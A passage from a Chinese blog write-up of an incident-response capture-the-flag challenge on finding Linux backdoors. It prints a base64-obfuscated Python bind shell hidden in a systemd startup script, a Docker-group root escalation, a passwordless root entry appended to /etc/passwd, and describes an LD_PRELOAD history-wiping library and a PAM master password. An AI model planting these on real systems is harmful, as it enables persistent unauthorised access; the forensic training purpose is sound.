+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Docker Compose Application</span><br><span class="line">After=network.target docker.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">WorkingDirectory=/home/user/</span><br><span class="line">ExecStart=/bin/bash /usr/lib/python3.7/site-packages/docker/startup.sh</span><br><span class="line">ExecStop=/usr/bin/docker-compose down</span><br><span class="line">Restart=always</span><br><span class="line">User=user</span><br><span class="line">TimeoutStartSec=0</span><br><span class="line">TimeoutStopSec=0</span><br><span class="line">KillMode=process</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<p>查看&#x2F;usr&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;docker&#x2F;startup.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">/usr/local/bin/docker-compose -f /home/user/nginx/docker-compose.yml up -d</span><br><span class="line"></span><br><span class="line">echo &#x27;import base64;v=base64.b64decode(&quot;aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwoKIyBDcmVhdGUgc29ja2V0IG9iamVjdApzID0gc29ja2V0LnNvY2tldCgpCnMuYmluZCgoJycsIDgwODApKQpzLmxpc3RlbigxKQoKIyBDb250aW51b3VzbHkgYWNjZXB0IGNvbm5lY3Rpb25zCndoaWxlIFRydWU6CiAgICBjb25uLCBhZGRyID0gcy5hY2NlcHQoKQogICAgdHJ5OgogICAgICAgICMgTGF1bmNoIGJhc2ggc2hlbGwgY29ubmVjdGVkIHRvIHRoaXMgc29ja2V0CiAgICAgICAgc3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9iYXNoJ10sIHN0ZGluPWNvbm4sIHN0ZG91dD1jb25uLCBzdGRlcnI9Y29ubikKICAgIGZpbmFsbHk6CiAgICAgICAgIyBFbnN1cmUgdGhlIGNvbm5lY3Rpb24gaXMgY2xvc2VkIGFmdGVyIHVzZQogICAgICAgIGNvbm4uY2xvc2UoKQo=&quot;);exec(v)&#x27;|nohup python3 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>base64解码发现是个反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import socket, subprocess</span><br><span class="line"></span><br><span class="line"># Create socket object</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.bind((&#x27;&#x27;, 8080))</span><br><span class="line">s.listen(1)</span><br><span class="line"></span><br><span class="line"># Continuously accept connections</span><br><span class="line">while True:</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    try:</span><br><span class="line">        # Launch bash shell connected to this socket</span><br><span class="line">        subprocess.call([&#x27;/bin/bash&#x27;], stdin=conn, stdout=conn, stderr=conn)</span><br><span class="line">    finally:</span><br><span class="line">        # Ensure the connection is closed after use</span><br><span class="line">        conn.close()</span><br></pre></td></tr></table></figure>
+
+<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>找出开机启动的后门服务名称MD5，提交flag{md5(服务名)}</p>
+<p>继上题，就是docker-compose-app.service</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5213e47de16522f1dc3f9e9ecc0ab8b0&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他思路</p>
+<p>看一下开机自启动服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files --type=service --state=enabled</span><br><span class="line"></span><br><span class="line">systemctl list-unit-files --type=service</span><br></pre></td></tr></table></figure>
+
+<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>渗透提权获得root目录下的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line"></span><br><span class="line">uid=1000(user) gid=1000(user) groups=1000(user),1001(docker)</span><br></pre></td></tr></table></figure>
+<p>user 用户在 docker 组里面，而且 docker 有 root 权限</p>
+<p>通过挂载目录提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name shell -v /:/n0o0b -it nginx:1  bash</span><br></pre></td></tr></table></figure>
+
+<p>进入n0o0b目录，cat root&#x2F;flag即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ATMB_root&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提权后可以添加一个新的有root权限的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;n0o0b::0:0::/root:/bin/bash&quot; &gt;&gt; /n0o0b/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>这样退出docker后切换用户即可拿root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su n0o0b</span><br></pre></td></tr></table></figure>
+
+<h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p>黑客3s埋了一个flag在权限维持过程中的地方，可以发现flag{}括号内的首字母是c开头，如flag{cxxxxxxx}</p>
+<p>切换到n0o0b用户后，打开所有 crontab-jobs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2&gt;/dev/null | grep -v &quot;^#&quot;</span><br></pre></td></tr></table></figure>
+<p>但是没有发现flag</p>
+<p>不过crontab -e可以看到<br><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/13.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cr0nt4b_IRfind&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/syslog |grep &#x27;flag&#x27;</span><br><span class="line"></span><br><span class="line">cat -A /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>黑客3s做了一个root用户执行cat命令就删除文件的操作，请发现删除了什么文件将文件名作为flag提交</p>
+<p>由题意容易想到环境变量劫持</p>
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/14.png" alt="alt text"></p>
+<p>执行env命令发现LD_PRELOAD劫持动态链接库<br>追踪一下&#x2F;bin&#x2F;cat也能看出链接了Nomal.so</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f -e trace=file /bin/cat</span><br></pre></td></tr></table></figure>
+
+<p>逆向Nomal.so，检查字符串就能看到删除了.bash_history</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;.bash_history&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p>黑客3s很执着清理痕迹，并做了一个持续删痕迹的手段，请发现手段并给出删除的完整黑客删除命令的md5，如flag{md5(rm -f &#x2F;var&#x2F;log&#x2F;ssh.log &gt;&#x2F;dev&#x2F;stdout)} </p>
+<p>接上题，逆向Nomal.so发现执行了rm -rf ~&#x2F;.bash_history &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b0f531b39d88d4f603fc89bd4dd2c0aa&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>黑客3s设置了一个万能密码后门使得这一个万能密码可以以所有用户身份登陆，也不影响原来密码使用。请发现这个万能密码，提交flag格式为flag{万能密码} </p>
+<p>万能密码首先想到的是 openssh 替换或者 pam 替换<br>pam_unix.so 负责与本地 Unix 系统认证进行交互，主要用于处理用户的身份验证，如密码验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /lib /lib64 /usr/lib /usr/lib64 -name pam_unix.so</span><br></pre></td></tr></table></figure>
+
+<p>逆向分析pam_unix.so</p>
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/15.png" alt="alt text"></p>
+<p>看到密码是 ATMB6666</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ATMB6666&#125;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/">http://example.com/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/27/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" title="域渗透基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">域渗透基础</div></div><div class="info-2"><div class="info-item-1">域渗透基础知识</div></div></div></a><a class="pagination-related  no-desc" href="/2025/04/30/%E7%8E%84%E6%9C%BAweb/" title="玄机web"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">玄机web</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/05/01/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="2024长城杯决赛应急响应"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-01</div><div class="info-item-2">2024长城杯决赛应急响应</div></div></div></a><a class="pagination-related no-desc" href="/2025/05/04/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA-%E5%8C%BB%E9%99%A2%E8%84%B1%E5%BA%93%E5%BA%94%E6%80%A5%E5%A4%84%E7%90%86/" title="玄机-应急加固-医院脱库应急处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-04</div><div class="info-item-2">玄机-应急加固-医院脱库应急处理</div></div></div></a><a class="pagination-related no-desc" href="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/" title="玄机-应急响应-vulntarget"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-01</div><div class="info-item-2">玄机-应急响应-vulntarget</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">1.</span> <span class="toc-text">2025长城杯半决赛-应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-number">1.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-number">1.4.</span> <span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5"><span class="toc-number">1.5.</span> <span class="toc-text">5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5"><span class="toc-number">2.</span> <span class="toc-text">玄机-linux后门应急</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1"><span class="toc-number">2.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1"><span class="toc-number">2.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1"><span class="toc-number">2.4.</span> <span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1"><span class="toc-number">2.5.</span> <span class="toc-text">5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6"><span class="toc-number">2.6.</span> <span class="toc-text">6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7"><span class="toc-number">2.7.</span> <span class="toc-text">7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8"><span class="toc-number">2.8.</span> <span class="toc-text">8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9"><span class="toc-number">2.9.</span> <span class="toc-text">9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10"><span class="toc-number">2.10.</span> <span class="toc-text">10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11"><span class="toc-number">2.11.</span> <span class="toc-text">11</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/08/HNCTF2025/" title="HNCTF2025">HNCTF2025</a><time datetime="2025-06-08T15:37:49.000Z" title="发表于 2025-06-08 23:37:49">2025-06-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/04/D3CTF2025/" title="D3CTF2025">D3CTF2025</a><time datetime="2025-06-04T06:10:33.000Z" title="发表于 2025-06-04 14:10:33">2025-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/28/nssctf-pwn%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="nssctf-pwn入门题单">nssctf-pwn入门题单</a><time datetime="2025-05-28T01:35:03.000Z" title="发表于 2025-05-28 09:35:03">2025-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/26/LitCTF2025/" title="LitCTF2025">LitCTF2025</a><time datetime="2025-05-26T08:13:36.000Z" title="发表于 2025-05-26 16:13:36">2025-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化">python反序列化</a><time datetime="2025-05-08T06:37:06.000Z" title="发表于 2025-05-08 14:37:06">2025-05-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
